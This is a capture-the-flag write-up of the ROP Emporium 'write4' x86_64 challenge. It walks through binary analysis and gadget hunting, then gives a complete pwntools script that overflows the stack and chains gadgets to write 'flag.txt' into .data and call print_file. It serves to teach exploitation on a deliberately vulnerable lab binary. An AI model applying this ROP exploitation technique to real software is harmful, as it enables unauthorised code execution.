---
Title: Ropemporium x86_64 write4
Date: 2023-06-04
Tags: [linux, python, ROP, x86_64, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# write4

## Description

Things have been rearranged a little for this challenge; the printing logic has been moved into a separate library in an attempt to mitigate the alternate solution that is possible in the callme challenge. The stack smash also takes place in a function within that library, but don't worry this will have no effect on your ROP chain.

Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

## Discovery

``` sh
04_write$ ./write4
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAAAAAAAAAAAAAAAAAAAAA
Thank you!
```

### Security checks

``` sh
gef➤  checksec
[+] checksec for '/home/jce/w/ropemporium/x64/04_write/write4'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```

### Functions

``` sh
gef➤  disass main
Dump of assembler code for function main:
   0x0000000000400607 <+0>:	push   rbp
   0x0000000000400608 <+1>:	mov    rbp,rsp
   0x000000000040060b <+4>:	call   0x400500 <pwnme@plt>
   0x0000000000400610 <+9>:	mov    eax,0x0
   0x0000000000400615 <+14>:	pop    rbp
   0x0000000000400616 <+15>:	ret
End of assembler dump.
```

The pwnme function is imported from libwrite4.so:

``` sh
gef➤  disas pwnme
Dump of assembler code for function pwnme@plt:
   0x0000000000400500 <+0>:	jmp    QWORD PTR [rip+0x200b12]        # 0x601018 <pwnme@got.plt>
   0x0000000000400506 <+6>:	push   0x0
   0x000000000040050b <+11>:	jmp    0x4004f0
End of assembler dump.
```

And a print_file function too:

``` sh
gef➤  disass print_file
Dump of assembler code for function print_file@plt:
   0x0000000000400510 <+0>:	jmp    QWORD PTR [rip+0x200b0a]        # 0x601020 <print_file@got.plt>
   0x0000000000400516 <+6>:	push   0x1
   0x000000000040051b <+11>:	jmp    0x4004f0
```

We have to call the print_file function with a memory address containing "flag.txt".

## Looking for memory address to store "flag.txt"

``` sh
04_write$ readelf -S write4
. . .
  [21] .got              PROGBITS         0000000000600ff0  00000ff0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000028  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
```

We can use
 - the .bss section in 0000000000601038 with a size of 8 bytes
 - the .data section 0000000000601028 with a size of 16 bytes.

.bss section :
we can use this section to write ou "flag.txt" (8 bytes).
But what about the final zero needed i C convention ?

Looking in gdb if a zero is fortunately present

     gef➤  i file
     Symbols from "/home/jce/w/ropemporium/x64/04_write/write4".
     Local exec file:
          `/home/jce/w/ropemporium/x64/04_write/write4', file type elf64-x86-64.
          Entry point: 0x400520
          0x0000000000400238 - 0x0000000000400254 is .interp
          0x0000000000400254 - 0x0000000000400274 is .note.ABI-tag
          0x0000000000400274 - 0x0000000000400298 is .note.gnu.build-id
          0x0000000000400298 - 0x00000000004002d0 is .gnu.hash
          0x00000000004002d0 - 0x00000000004003c0 is .dynsym
          0x00000000004003c0 - 0x000000000040043c is .dynstr
          0x000000000040043c - 0x0000000000400450 is .gnu.version
          0x0000000000400450 - 0x0000000000400470 is .gnu.version_r
          0x0000000000400470 - 0x00000000004004a0 is .rela.dyn
          0x00000000004004a0 - 0x00000000004004d0 is .rela.plt
          0x00000000004004d0 - 0x00000000004004e7 is .init
          0x00000000004004f0 - 0x0000000000400520 is .plt
          0x0000000000400520 - 0x00000000004006a2 is .text
          0x00000000004006a4 - 0x00000000004006ad is .fini
          0x00000000004006b0 - 0x00000000004006c0 is .rodata
          0x00000000004006c0 - 0x0000000000400704 is .eh_frame_hdr
          0x0000000000400708 - 0x0000000000400828 is .eh_frame
          0x0000000000600df0 - 0x0000000000600df8 is .init_array
          0x0000000000600df8 - 0x0000000000600e00 is .fini_array
          0x0000000000600e00 - 0x0000000000600ff0 is .dynamic
          0x0000000000600ff0 - 0x0000000000601000 is .got
          0x0000000000601000 - 0x0000000000601028 is .got.plt
          0x0000000000601028 - 0x0000000000601038 is .data
          0x0000000000601038 - 0x0000000000601040 is .bss
     gef➤  x/8x 0x0000000000601038
     0x601038 <completed.7698>:	0x00000000	0x00000000	Cannot access memory at address .

oups  No memory is allocated after the bss segment.

Practically, it works but we don't keep .bss as as good option.

.data

If we observe the memory contents for .data :

     gef➤  x/10x 0x0000000000601028
     0x601028:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
     0x601030:	0x00	0x00

We can see a zero value in 0x601030.

So the string can be written with only one 8-byte write operation.

## Looking for useful gadgets

Looking for a move, add, sub xor operation with as destination a interesting operand [reg].

For example : "mov [rax], rbx" , write le value of rbx in the address pointed by rax:

     # ROPgadget --binary write4|grep mov|grep ret
     0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
     0x0000000000400629 : mov dword ptr [rsi], edi ; ret
     0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
     0x0000000000400628 : mov qword ptr [r14], r15 ; ret

We can use "mov [r14], r15"

But we must load r14, r15 to use it.

     # ROPgadget --binary write4|grep "pop r14"
     0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
     0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
     0x0000000000400690 : pop r14 ; pop r15 ; ret
     0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
     0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
     0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

So we have a tool write to a choosen address

     0x0400628 : mov qword ptr [r14], r15 ; ret
And to load the two registers :
     0x0400690 : pop r14 ; pop r15 ; ret

After that as before we can load rdi with our function parameter with a "pop rdi" gadget:

     0x0400693 : pop rdi ; ret

## Build the attack

1. Load r14, r15 with the writable memory address and "flag.txt" respectively.
2. mov [r14], r15
3. load rdi with memory address
4. Call print_file


|ropchain |comment|
|----------|-----|
| pop r14; pop r15 | pop gadget |
| @data | for r14 |
| flag.txt | for r15 |
| mov [r14], r15| write |
| pop rdi |set rdi |
| @data|@flag.txt|
| print_file|exploit|

## Exploitation

### Python script

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+150
c
'''

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('write4')
context.binary=elf

print_file=elf.plt['print_file']

data = 0x0601028
# pop r14 ; pop r15 ; ret
pop_r1415=0x400690
# mov qword ptr [r14], r15 ; ret
write_r14=0x400628
# pop rdi ; ret
pop_rdi = 0x400693

# Produie la chaine de gadget pour ecrite un message de taille arbitraire
# à un adresse donnée.
# Le zero final doit être explicite
def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r1415)
        r += p64(addr)
        r += data[i:i+8]
        r += p64(write_r14)
    return r

log.info("start")
PL =b"A"*offset
PL+=w_write(data,"flag.txt")
PL+=p64(pop_rdi)
PL+=p64(data)
PL+=p64(print_file)

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

io.sendline(PL)
io.interactive()
```

### Execution

     04_write# python3 solve.py
     [*] '/w/ropemporium/x64/04_write/write4'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
     RUNPATH:  b'.'
     [*] start
     [+] Starting local process '/w/ropemporium/x64/04_write/write4': pid 106
     [*] Switching to interactive mode
     write4 by ROP Emporium
     x86_64

     Go ahead and give me the input already!

     > Thank you!
     ROPE{a_placeholder_32byte_flag!}
     [*] Got EOF while reading in interactive

Et voilà
